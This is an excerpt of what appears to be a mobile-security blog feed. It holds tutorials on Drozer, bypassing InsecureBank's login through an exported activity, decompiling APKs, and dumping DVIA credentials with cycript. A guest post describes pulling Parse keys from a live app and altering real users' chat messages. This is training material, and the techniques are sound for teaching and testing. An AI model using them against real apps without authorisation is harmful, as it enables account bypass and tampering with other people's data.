   <content type="html">&lt;p&gt;I have decided to give away the solutions for DVIA for free. The reason for this has been too many people coming up with queries for the solutions and i believed giving away the solutions for free would really benefit the infosec community. It has taken me a lot of nights and hard work to create this project and specially the solutions. If you think this project has been useful to you and your organization, please consider making a donation to this project. You can donate to this project and download the solutions for free from &lt;a href=&quot;http://damnvulnerableiosapp.com/#solutions&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;-Prateek&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Android Application hacking with Insecure Bank Part 4</title>
   <link href="https://bitbrain.github.io/2015/03/29/android-application-hacking-with-insecure-bank-part-4.html"/>
   <updated>2015-03-29T00:17:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/03/29/android-application-hacking-with-insecure-bank-part-4</id>
   <content type="html">&lt;p&gt;In this article, we will look at a very handy framework for analysis of android applications named Drozer. Drozer is a very useful tool as it eliminates the need for having seperate tools for performing different security checks in an android application. It has a list of modules that you can use to interact with the application using Android’s Inter-Process communication. Additionally, you can also install exploits and use it to exploit an android device.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;The main purpose of this article is to make sure you are familiar with drozer so we can use it in the future articles.&lt;/p&gt;

&lt;p&gt;The first thing to do is to install the drozer community edition from &lt;a href=&quot;https://www.mwrinfosecurity.com/products/drozer/&quot;&gt;this&lt;/a&gt; link. You need to install both the drozer installer and the Agent.apk file which is the application that needs to be deployed on the device/emulator and acts as a communicator between the system and the application to be audited.&lt;/p&gt;

&lt;p&gt;Once drozer has been installed on your system, install the agent.apk on your device/emulator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will first need to set up port forwarding so that your system can connect to a TCP socket opened by the Agent inside the emulator, or on the device. By default, drozer uses port 31415:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also make sure to start the agent application and start the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now you can connect to the agent using the following command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can list all the different modules by using the list command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Every module requires different options. If you want to see the different options for a particular module, use run followed by the module name followed by -h.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For e.g, to see a list of all the packages installed, you can use the module app.package.list.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, to find info about a particular packages, use the module app.package.info. It will give out a lot of info about the application, for e.g the path where the application files are stored, the permissions that the application uses etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another useful module is app.package.attacksurface. It tells you about the exported components as well as whether the application is debuggable or not. We will look at exploiting debuggable applications in later articles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, let’s do the same thing we did in the last article, call an exported activity in the insecure bank application. For that, we will use the module app.activity.start.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And you will see the same result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In some cases, the activity might have an intent filter. For e.g, below is a sample intent filter.&lt;/p&gt;

&lt;activity android:name=&quot;ShareActivity&quot;&gt;&lt;intent-filter&gt;&lt;action android:name=&quot;android.intent.action.SEND&quot;&gt;&lt;category android:name=&quot;android.intent.category.DEFAULT&quot;&gt;&lt;data android:mimetype=&quot;text/plain&quot;&gt;&lt;/data&gt;&lt;/category&gt;&lt;/action&gt;&lt;/intent-filter&gt;&lt;/activity&gt;

&lt;p&gt;Drozer supports calling activities by specifying actions and extra paramters also.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib4/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is an example of calling an activity with extra parameter&lt;/p&gt;

&lt;p&gt;&lt;em&gt;run app.activity.start –component com.mwr.example.intenttest com.mwr.example.intenttest.IntentActivity –flags ACTIVITY_NEW_TASK –extra string URL “Some Text”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In this article, we got comfortable with using Drozer. Drozer can do much more, and we will be discussing all those features as we discuss more vulnerabilities in InsecureBank in the next article.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Android Application hacking with Insecure Bank Part 3</title>
   <link href="https://bitbrain.github.io/2015/03/28/android-application-hacking-with-insecure-bank-part-3.html"/>
   <updated>2015-03-28T00:17:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/03/28/android-application-hacking-with-insecure-bank-part-3</id>
   <content type="html">&lt;p&gt;In this article, we will look at attacking components in Android applications, starting with activities. But first, it is essential to understand what Android application components are. Android application components are the essential building blocks of an Android application. The behaviour and interaction between these components is defined in the manifest.xml file in the application. Mainly there are 4 types of components and it is important to understand their purpose and function.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The description of the 4 components given below has been taken from &lt;a href=&quot;http://www.tutorialspoint.com/android/android_application_components.htm&quot;&gt;this&lt;/a&gt; link.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Activities - They dictate the UI and handle the user interaction to the smartphone screen&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Services - They handle background processing associated with an application.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Broadcast Receivers - They handle communication between Android OS and applications.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Content Providers - They handle data and database management issues.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;activities&quot;&gt;Activities&lt;/h4&gt;

&lt;p&gt;An activity represents a single screen with a user interface. For example, an email application might have one activity that shows a list of new emails, another activity to compose an email, and another activity for reading emails. If an application has more than one activity, then one of them should be marked as the activity that is presented when the application is launched. An activity is implemented as a subclass of Activity class as follows:&lt;/p&gt;

&lt;pre&gt;public class MainActivity extends Activity {

}&lt;/pre&gt;

&lt;h4 id=&quot;services&quot;&gt;Services&lt;/h4&gt;

&lt;p&gt;A service is a component that runs in the background to perform long-running operations. For example, a service might play music in the background while the user is in a different application, or it might fetch data over the network without blocking user interaction with an activity. A service is implemented as a subclass of Service class as follows:&lt;/p&gt;

&lt;pre&gt;public class MyService extends Service {

}&lt;/pre&gt;

&lt;h4 id=&quot;broadcast-receivers&quot;&gt;Broadcast Receivers&lt;/h4&gt;

&lt;p&gt;Broadcast Receivers simply respond to broadcast messages from other applications or from the system. For example, applications can also initiate broadcasts to let other applications know that some data has been downloaded to the device and is available for them to use, so this is broadcast receiver who will intercept this communication and will initiate appropriate action. A broadcast receiver is implemented as a subclass of BroadcastReceiver class and each message is broadcasted as an Intent object.&lt;/p&gt;

&lt;pre&gt;public class MyReceiver  extends  BroadcastReceiver {

}&lt;/pre&gt;

&lt;h4 id=&quot;content-providers&quot;&gt;Content Providers&lt;/h4&gt;

&lt;p&gt;A content provider component supplies data from one application to others on request. Such requests are handled by the methods of the ContentResolver class. The data may be stored in the file system, the database or somewhere else entirely. A content provider is implemented as a subclass of ContentProvider class and must implement a standard set of APIs that enable other applications to perform transactions.&lt;/p&gt;

&lt;pre&gt;public class MyContentProvider extends  ContentProvider {

}&lt;/pre&gt;

&lt;h4 id=&quot;additional-components&quot;&gt;Additional Components&lt;/h4&gt;

&lt;p&gt;There are additional components which will be used in the construction of above mentioned entities, their logic, and wiring between them. These components are:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Fragments - Represents a behavior or a portion of user interface in an Activity.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Views - UI elements that are drawn onscreen including buttons, lists forms etc.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Layouts - View hierarchies that control screen format and appearance of the views.&amp;lt;/td&amp;gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Intents - Messages wiring components together.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Resources - External elements, such as strings, constants and drawables pictures.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Manifest - Configuration file for the application.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;one-of-the-most-important-attributes-of-components-is-the-exported-property-here-is-the-documentation-from-android-about-it&quot;&gt;One of the most important attributes of components is the exported property. Here is the documentation from android about it.&lt;/h4&gt;

&lt;h4 id=&quot;androidexported&quot;&gt;android:exported&lt;/h4&gt;

&lt;p&gt;Whether or not the activity can be launched by components of other applications — “true” if it can be, and “false” if not. If “false”, the activity can be launched only by components of the same application or applications with the same user ID.The default value depends on whether the activity contains intent filters. The absence of any filters means that the activity can be invoked only by specifying its exact class name. This implies that the activity is intended only for application-internal use (since others would not know the class name). So in this case, the default value is “false”. On the other hand, the presence of at least one filter implies that the activity is intended for external use, so the default value is “true”.This attribute is not the only way to limit an activity’s exposure to other applications. You can also use a permission to limit the external entities that can invoke the activity (see the permission attribute).&lt;/p&gt;

&lt;p&gt;Hence, if an activity is exported, it can be called by external applications. In order to test the vulnerable activity exercise in InsecureBank application, let’s first start the application on Genymotion emulator and start the backend server as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we start the app, we are presented with this login page. If the activity after a successful login is exported, then we can call that activity directly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s have a look at the manifest file of the application to see if we can find the relevant activity. To look at the manifest file, first decompress the application using apktool as shown in the image below. This will create an application folder and the manifest file will be located inside it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is how the manifest file looks like. As you can see, there is an activity named &lt;em&gt;.PostLogin&lt;/em&gt; which is set as exported.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can call this activity directly using the activity manager tool in the emulator. Let’s have a look at the usage first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To start an activity with the am tool, here is the command.&lt;/p&gt;

&lt;pre&gt;adb shell
am start -n com.package.name/com.package.name.ActivityName
&lt;/pre&gt;

&lt;p&gt;In this case, the package name is com.android.insecurebankv2 as can be seen from the manifest file.&lt;/p&gt;

&lt;p&gt;So let’s call the PostLogin activity by using the command shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the application, you can see that you have successfully bypassed the login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib3/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also call activity or other components using drozer. We will look at drozer in the next article.&lt;/p&gt;

&lt;p&gt;There are a couple of ways to prevent from these kinds of vulnerabilities. First of all, the android:exported property should always be set to FALSE unless really necessary. Secondly, if the application needs to be called from some specific external applications, you can add custom permissions to the activity and only allow applications that requests that permission to call the activity.&lt;/p&gt;

&lt;p&gt;Before we move on to the next article, make sure you have a proper understanding of the &lt;a href=&quot;http://developer.android.com/guide/topics/manifest/manifest-intro.html&quot;&gt;Android manifest&lt;/a&gt; file and the different components in an andorid application.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 39 – Sensitive information in memory</title>
   <link href="https://bitbrain.github.io/2015/03/24/ios-application-security-part-39-sensitive-information-in-memory.html"/>
   <updated>2015-03-24T00:16:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/03/24/ios-application-security-part-39-sensitive-information-in-memory</id>
   <content type="html">&lt;p&gt;In this article, we will look at analyzing the memory contents of an iOS application. iOS applications may store sensitive information like passwords, session IDs etc in the memory of the application without releasing them. In some cases, releasing these variables may not be an option. For e.g, it might be required for the application to send an authentication token with every request and hence there has to be a reference to it in the memory somewhere. Even though these variables might be encrypted when stored locally in the application, these variables will be in their unencryped format while the application is running. Hence, analyzing the contents of the memory is an important thing while pentesting an iOS application. If there are some important properties or instance variables that are not required, they should be released from the memory.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Basically, the memory of the application will contain a lot of information, most of which we will not be interested in. These things might include instantiated UIViews and other UI elements. We will definitely be interested in instantiated view controllers and their properties though. It is important to understand and focus on only the relevant information in the memory. For a penetration tester, you should mainly be interested in all the values of the properties and instance variable in an application.&lt;/p&gt;

&lt;p&gt;We will be solving the Sensitive information in memory challenge in &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS application&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/ios39/1.PNG&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we look at the challenges, the first challenge is to find properties named username and password. To do that, first we have to get the reference to the current view controller. From the class-dump output of the application, it is easy to figure out that the class name of this view controller is &lt;em&gt;SensitiveInformationDetailsVC&lt;/em&gt;. We can find the reference to this class objects using the choose function in cycript. The choose function takes an Objective-C class as an argument, and attempts to scavenge the heap looking for regions of memory that are the right size and shape as the class (or any subclasses of that class) you have specified. So basically, it will find references to all objects of the classes and subclasses that you have provided.&lt;/p&gt;

&lt;p&gt;Hence, to find the instances of the class &lt;em&gt;SensitiveInformationDetailsVC&lt;/em&gt;, let’s use the choose function with the class name as the argument.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios39/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, there is only one reference, and can be accessed using the index 0.&lt;/p&gt;

&lt;p&gt;To find out all properties, use the command a[0]-&amp;gt;isa.messages.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios39/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, you can scan the output for all property names that you find interesting. Since we already know the property names in the challenge, which is username and password, we can directly access them using the commands shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios39/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s it. Pretty simple isn’t it.&lt;/p&gt;

&lt;p&gt;Next, we need to find some instance variable. For this, we need to define a function that will print all the instance variables for a particular instance.&lt;/p&gt;

&lt;p&gt;function tryPrintIvars(a){ var x={}; for(i in &lt;em&gt;a){ try{ x[i] = (&lt;/em&gt;a)[i]; } catch(e){} } return x; }&lt;/p&gt;

&lt;p&gt;Now, lets give the input as the instance of the class &lt;em&gt;SensitiveInformationDetailsVC&lt;/em&gt; and we can see that it printed out all the instance variables along with their values.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios39/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, we cannot find an instance variable named passwd. What’s going on ? Well, here’s the thing. The thing with instance variables is that they can be initialized within a particular method. If the function hasn’t been called, the instance variable wouldn’t be initialized. Also, because of a feature knows an ARC (Automatic reference counting) in iOS, the variables will automatically be released once the function has stopped executing. In some cases, you might not be able to call a function via manual browsing of the application, and that’s where cycript becomes useful. Going back to the methods of this class, we see that there is a method named &lt;em&gt;initializeLogin&lt;/em&gt;. And since it is the only other method apart from the regular iOS methods like viewDidLoad and didReceiveMemoryWarning, it is safe to assume that the instance variable is created in this method.&lt;/p&gt;

&lt;p&gt;Once we call the function initializeLogin, the instance variable will instantiate and be stored in the memory of the application. The trick here is to use GDB to analye the application contents during the runtime and find the value of the variable before the function stops executing.. I will leave this as an exercise for you. And just for the sake of convenience, here is the source code of the initializeLogin method.&lt;/p&gt;

&lt;pre&gt;-(void)initializeLogin {
    //DO random stuff
    NSString *passwd = @&quot;MYw0r1d1821&quot;;
    //Finish doing random stuff
}&lt;/pre&gt;

&lt;p&gt;Mark Beard has written a nice article on dumping application memory from the heap and also released a tool to do so. I would recommend that you check the &lt;a href=&quot;https://blog.netspi.com/ios-tutorial-dumping-the-application-heap-from-memory/&quot;&gt;article&lt;/a&gt; out as well.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Android Application hacking with Insecure Bank Part 2</title>
   <link href="https://bitbrain.github.io/2015/03/23/android-application-hacking-with-insecure-bank-part-2.html"/>
   <updated>2015-03-23T00:16:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/03/23/android-application-hacking-with-insecure-bank-part-2</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at setting up a mobile pentesting platform for Android applications. By now, you must have set up an emulator using genymotion and installed all the android command line tools along with some other additonal tools (drozer, dex2jar, apktool). In this article, we will look at some information gathering techniques. We will see how we can decompile an application to its java source, analyze the signature of the application and many more things.&lt;/p&gt;

&lt;p&gt;At this point, i would also like to mention that if you are looking for a VM that contains all the tools to cater to your android application pentesting needs, have a look at &lt;a href=&quot;https://androidtamer.com/&quot;&gt;Android Tamer&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;First of all, make sure you have the latest version of InsecureBankv2 on your system. You can do a &lt;em&gt;git pull&lt;/em&gt; to merge all the latest changes to your master branch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, let’s do some analysis on the apk file. Copy the apk file into a seperate folder for some analysis. Just like an iOS ipa file, an apk file is a compressed file, so you can decompress it by just changing the extension from apk to zip and then extracting it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now browse over to the extracted folder and have a look. You can see a lot of files here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s describe them one by one.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AndroidManifest.xml - This is probably by far the most important source of information. From a security point of view, it contains information about the various components used in an application and lists the conditions in which they can be launched. It also displays information about the permissiosns that the application uses. I would highly recommend you to go through Google’s &lt;a href=&quot;http://developer.android.com/guide/topics/manifest/manifest-intro.html&quot;&gt;documentation&lt;/a&gt; on the manifest file. We will discuss each component of an android application as we discuss vulnerabilities in them.&lt;/li&gt;
  &lt;li&gt;assets - This is used to store raw assets file. The files stored here as compiled as is into the apk file.&lt;/li&gt;
  &lt;li&gt;res - Used to store resources such as /images/posts/ib2/, layout files, and string values.&lt;/li&gt;
  &lt;li&gt;META-INF - Contains important information about the signature and the person who signed the application.&lt;/li&gt;
  &lt;li&gt;classes.dex - This is where the compiled application code lies. To decompile an application, you need to convert the dex file to a jar file which can then be read by a java decompiler&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The information about the public key certificate is stored in the CERT.RSA file in the META-INF folder. To find out information about the public key certificate, use the command &lt;em&gt;keytool –printcert –file META-INF/CERT.RSA&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//z.png&quot; alt=&quot;Z&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that it is also possible to modify the code of an apk file after decompiling and then recompile it to deploy to a device. However, once the application code is modified, it loses its integrity and hence needs to be resigned with a new public/private key pair. I would recommend that you have a look at &lt;a href=&quot;http://developer.android.com/tools/publishing/app-signing.html&quot;&gt;this&lt;/a&gt; article that explains how to create your own public/private key pair. We will look at modifying application logic and then recompiling it in later articles in this series.&lt;/p&gt;

&lt;p&gt;Once an application has been recompiled, you can verify its integrity using the jarsigner application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//j.png&quot; alt=&quot;J&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s decompile the application using dex2jar. dex2jar can also take input as an apk file (rather than .dex file) and converts it into a jar file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//x.png&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you can simple open this file in JD-GUI and have a look at the source code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib2//y.png&quot; alt=&quot;Y&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now scan through the source code to find potential vulnerabilities in the application. We can clearly note how easy it is to reverse engineer an apk file and look at the source code. It is important to note here that we are able to see the source code and understand it mainly because there is no code obfuscation applied in the application. Google provides tools like Proguard to help in obfuscating code. While this is not foolproof, there is also a commercial version of Proguard knows an DexGuard that works even better in applying code obfuscation. We will look at obfuscating application code in later articles.&lt;/p&gt;

&lt;p&gt;In this article, we looked at how we can extract information from an apk file. In the next article, we will start looking at the different types of vulnerabilities demonstrated in InsecurBankv2.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 38 - Attacking apps using Parse (Guest Lecture by Egor Tolstoy)</title>
   <link href="https://bitbrain.github.io/2015/01/24/ios-application-security-part-38-attacking-apps-using-parse-guest-lecture-by-egor-tolstoy.html"/>
   <updated>2015-01-24T00:16:00+00:00</updated>
   <id>https://bitbrain.github.io/2015/01/24/ios-application-security-part-38-attacking-apps-using-parse-guest-lecture-by-egor-tolstoy</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;This is a guest lecture by &lt;a href=&quot;http://etolstoy.ru&quot;&gt;Egor Tolstoy&lt;/a&gt;. Egor is a full-time iOS developer working at Rambler&amp;amp;Co and living with his lovely wife in Moscow, Russia. In his spare time he investigate iOS applications for different vulnerabilities and blogs about my research.&lt;/strong&gt;&lt;/p&gt;

&lt;div&gt;[Parse](http://parse.com/) is a wonderful BaaS which helps with setting up backend infrastructure for your mobile application as fast as possible. Maybe just because of this simplicity many developers forget about a number of new security issues and vulnerabilities.&lt;/div&gt;

&lt;!--more--&gt;

&lt;div&gt;![](/images/posts/ios38/8822BC1A-FA0D-4BFF-8DC0-8CC103DFB92D.png)  
&lt;/div&gt;

&lt;div&gt;For those who don’t know what this service is, let’s make a brief introduction. Parse provides a lot of useful capabilities to mobile developer: cloud data storage, push notifications, usage statistics and crash logs gathering, code hosting, background jobs and a many other things. Within the boundaries of thes research we are interested in the cloud data storage, named _Cloud Core_.&lt;/div&gt;

&lt;div&gt;All the data in Cloud Core is stored in so called custom classes (ordinary database tables).&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/8879CA5B-B494-43CD-A136-1DB8059F5AC1.png)  
&lt;/div&gt;

&lt;div&gt;You can set a number of different client permissions for each of these classes: _GET, FIND, UPDATE, CREATE, DELETE_ and _ADD FIELDS_. All of them are _Public_ by default. Of course, most of the developers forget about the need of setting client access permissions once they configure their tables.&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/FDF17B0E-CD2B-47AB-BB46-F0D0BE9BDE7E.png)  
&lt;/div&gt;

&lt;div&gt;I’ve closely faced Parse during one of my work projects and spent a lot of time configuring ACLs properly - so I became interested in how other developers maintain their Parse accounts. I’ve found the object for my little research right on [parse.com/customers](https://parse.com/customers). It was [Cubefree](http://cubefreeapp.com/) - a service for locating cowering spaces.&lt;/div&gt;

&lt;div&gt;A pair of keys is used for connecting to Parse account from a mobile application: _Application ID_ and _Client Key_. We’ve got to find out these strings in order to manipulate the data in Cloud Core. Let’s decrypt the application binary with the help of [idb](https://github.com/dmayer/idb) - an awesome iOS pentesting utility. While the decryption process is going on, we can check _NSUserDefaults_ - a rather common place for storing such kind of data (only for reckless developers, of course).&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/03B3C111-1C51-4330-899E-7E5873D94B7F.png)  
&lt;/div&gt;

&lt;div&gt;As you can see, nothing criminal was found - no signs of confidential data. Let’s get back to our decrypted application binary and feed it to [Hopper](http://www.hopperapp.com/) - a well known disassembler, specialized in reverse-engineering Objective-C applications. Our quest for Parse keys will begin in &lt;span style=&quot;color: rgb(34, 34, 34); font-family: 'Helvetica Neue', Helvetica, Helvetica, Arial, sans-serif; background-color: rgb(255, 255, 255);&quot;&gt;_application:didFinishLaunchingWithOptions method_ of _App Delegate._ One of the noteworthy Hopper features is the ability to represent any procedure in pseudocode form, which flattens the reversed code understanding curve.&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/AB772C3F-377A-4B02-BA39-946D0B54831C.png)&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;font color=&quot;#222222&quot;&gt;As expected, the connection to Parse is initiated right here. Now we’ll analyse the structure of Parse data and its client permissions.&lt;/font&gt;&lt;/div&gt;

&lt;div&gt;&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;font color=&quot;#222222&quot;&gt;The next step is identification of Parse tables names. Actually, we can see them on the same screenshot as client keys - there is a plenty of _registerSubclass_ method calls. These classes are children of the root _PFObject_ class. Each of them has a method &lt;/font&gt;&lt;span style=&quot;color: rgb(34, 34, 34); font-family: 'Helvetica Neue', Helvetica, Helvetica, Arial, sans-serif; background-color: rgb(255, 255, 255);&quot;&gt;_parseClassName, _which returns a corresponding Parse table name.&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/FC415E09-109A-460B-9E04-763532556FDB.png)&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;font color=&quot;#222222&quot;&gt;Let’s inspect the structure of these tables:&lt;/font&gt;&lt;/div&gt;

&lt;div&gt;[https://gist.github.com/igrekde/cb8e2c12408715c9f739#file-parse-security-1](https://gist.github.com/igrekde/cb8e2c12408715c9f739#file-parse-security-1)&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;&lt;span style=&quot;color: rgb(34, 34, 34);&quot;&gt;  
&lt;/span&gt;&lt;/div&gt;

&lt;div&gt;The knowledge of classes organization, however, is not enough. We should try to inspect access permissions for all the Parse classes to determine how we can influence the application behaviour. It’s quite simple - all we have to do is to make a couple of queries to Parse and analyse their results. I’ve wrote a small utility - [Parse Revealer](https://github.com/igrekde/ParseRevealer), which simplifies these routine actions and automatically determines the access permissions for all known classes.&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/E171D146-358B-41FD-98E2-FBC293EBAFEF.png)  
&lt;/div&gt;

&lt;div&gt;We can create a table using all the derived data:&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/%D0%A1%D0%BA%D1%80%D0%B8%D0%BD%D1%88%D0%BE%D1%82%202015-01-24%2020.41.30.png)  
&lt;/div&gt;

&lt;div&gt;As we can see from the list of permissions, the developers tried to implement a security policy, but it wasn’t enough. Let’s show what we can achieve by manipulating the _ChatMessage_ class.&lt;/div&gt;

&lt;div&gt;The most obvious vulnerability is that the attacker is able to modify the text of any message in any chatroom. After the execution of this code block the reasonable statement turns into a nonsense:&lt;/div&gt;

&lt;div&gt;[https://gist.github.com/igrekde/cb8e2c12408715c9f739#file-parse-security-2](https://gist.github.com/igrekde/cb8e2c12408715c9f739#file-parse-security-2)  
&lt;/div&gt;

&lt;div&gt;![](/images/posts/ios38/cubefree-screen.png)  
&lt;/div&gt;

&lt;div&gt;We can also post new messages to any chat by providing a new _PFObject_ with a correct chatId. But we are noble pentesters, so let’s pay attention to the fact that we aren’t able to delete any message due to developers paranoia :).&lt;/div&gt;

